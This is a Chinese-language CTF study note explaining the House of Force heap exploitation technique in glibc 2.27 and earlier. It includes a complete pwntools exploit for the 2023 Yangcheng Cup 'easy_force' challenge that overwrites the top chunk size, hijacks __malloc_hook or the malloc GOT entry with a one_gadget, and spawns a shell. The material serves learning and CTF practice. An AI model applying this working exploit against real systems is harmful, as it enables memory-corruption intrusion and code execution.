---
title: House of Force
date: '2025-03-24 16:04:18'
updated: '2025-04-07 21:39:55'
---
## 条件
1. libc 版本： 2.27 及以前
2. free 不可控或没有

## 原理
House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。

> 不用堆漏洞来利用是什么意思...
>

如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下<font style="background-color:#FBDE28;">条件</font>：

1. 能够以溢出等方式控制到 top chunk 的 size 域
2. 能够自由地控制堆分配尺寸的大小

House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。

那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证

```python
// 获取当前的top chunk，并计算其对应的大小
victim = av->top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```

然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制 top chunk size 域的漏洞。

```python
(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
```

一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证。

```python
remainder      = chunk_at_offset(victim, nb);
av->top        = remainder;

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
```

之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。

与此同时，我们需要注意的是，topchunk 的 size 也会更新，其更新的方法如下

```python
victim = av->top;
size   = chunksize(victim);
remainder_size = size - nb;
set_head(remainder, remainder_size | PREV_INUSE);
```

所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。

## 2023 羊城杯 easy_force
![](/images/063eaf3185455c21105143c9d2d1fd9f.png)

没有 PIE，got 表部分可写

![](/images/f0e62f991ad395758a8f423d44d442a1.png)

就第一个选项是能用的，可以 malloc，但是没有 free

申请的大小还没有限制，存放在 bss 段

而 read 读取的大小固定，可以申请小 chunk 来实现堆溢出

### mmap 得到的内存
申请小的内存(利用系统调用`brk`)的地址都是在堆段，距离 libc 地址差距很大

![](/images/38a0ab45f4041f8020832730d391400b.png)![](/images/e680153e57cf98f2c53b499de94a1903.png)

而如果题目没有限制申请大小，就可以申请一个非常大的内存，10000000 数量级的字节数

这样申请的堆块是通过`mmap`系统调用得到的，地址比较靠近 libc 地址

![](/images/fac676dce831f2b87b6cd4f61e960c0a.png)



题目直接把申请的堆块的地址打印出来了，这样就可以泄露出 libc 基址和堆基址了

现在就有两条路可以走，

1. 将 topchunk 往低地址（程序）移动：通过堆基址算出 got 表的地址改函数的 got 表为 one_gadget
2. 将 topchunk 往高地址（libc 地址）移动：劫持 malloc_hook 为 one_gadget

看起来应该都可以，先试试劫持`malloc_hook`

### 劫持 malloc_hook 解法
泄露 libc 的部分：

```python
link.recvuntil(b'go away\n')
add(0,0x114514,b'a')
link.recvuntil(b'the balckbroad on ')
libc_base=int(link.recv()[:14],16)-0x4d7010
print('libc_base = '+hex(libc_base))
```

在利用堆溢出篡改 topchunk 的 size 的时候顺便泄露堆地址：

```python
add(1,0x10,p64(0x0)*3+p64(0xffffffffffffffff))
link.recvuntil(b'the balckbroad on ')
topchunk=int(link.recv()[:10],16)+0x10
print('topchunk = '+hex(topchunk))
```

在修改完 topchunk 的大小之后，再申请一个超级大的 chunk，让 topchunk 移动到`malloc_hook`的地址

```python
distance=malloc_hook-topchunk-0x20
add(2,str(distance),b'a'*8)
```

然后再申请一遍就会把`malloc_hook`申请到了

```python
add(3,0x10,p64(one_gadget))
# 然后再调用一遍malloc就getshell啦
link.recvuntil(b'go away\n')
link.sendline(b'1')
link.recvuntil(b'index?\n')
link.sendline(str(4))
link.recvuntil(b'want?\n')
link.sendline(str(0x10))
```

### 篡改 malloc got 表解法
在修改 topchunk 时传进去负数（malloc_got - topchunk - 一定的偏移）就可以了

```python
distance=elf.got['malloc']-topchunk-0x20
add(2,str(distance),b'a'*8)
```



完整 exp：

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

link=remote("node4.anna.nssctf.cn",28149)
# link=process("./ezforce")
elf=ELF("./ezforce")
libc=ELF("./glibc/2.23-0ubuntu11.3_amd64/libc.so.6")
ogg=[0x4527a,0xf03a4,0xf1247]

# gdb.attach(link,'set solib-search-path ~/FocusingCTF/glibc/2.23-0ubuntu11.3_amd64/')
# pause()

def add(index,size,content):
    link.sendline(b'1')
    link.recvuntil(b'index?\n')
    link.sendline(str(index))
    link.recvuntil(b'want?\n')
    link.sendline(str(size))
    link.recvuntil(b'write?\n')
    link.sendline(content)

link.recvuntil(b'go away\n')
add(0,0x114514,b'a')
link.recvuntil(b'the balckbroad on ')
libc_base=int(link.recv()[:14],16)-0x4d7010
print('libc_base = '+hex(libc_base))
one_gadget=libc_base+ogg[2]

malloc_hook=libc_base+libc.symbols['__malloc_hook']
print('malloc_hook = '+hex(malloc_hook))

# gdb.attach(link,'set solib-search-path ~/FocusingCTF/glibc/2.23-0ubuntu11.3_amd64/')
# pause()

add(1,0x10,p64(0x0)*3+p64(0xffffffffffffffff))
link.recvuntil(b'the balckbroad on ')
topchunk=int(link.recv()[:10],16)+0x10
print('topchunk = '+hex(topchunk))

# distance=malloc_hook-topchunk-0x20
distance=elf.got['malloc']-topchunk-0x20 #跟上面那句任选一句都能打通
add(2,str(distance),b'a'*8)

add(3,0x10,p64(one_gadget))

link.recvuntil(b'go away\n')
link.sendline(b'1')
link.recvuntil(b'index?\n')
link.sendline(str(4))
link.recvuntil(b'want?\n')
link.sendline(str(0x10))

link.interactive()
```

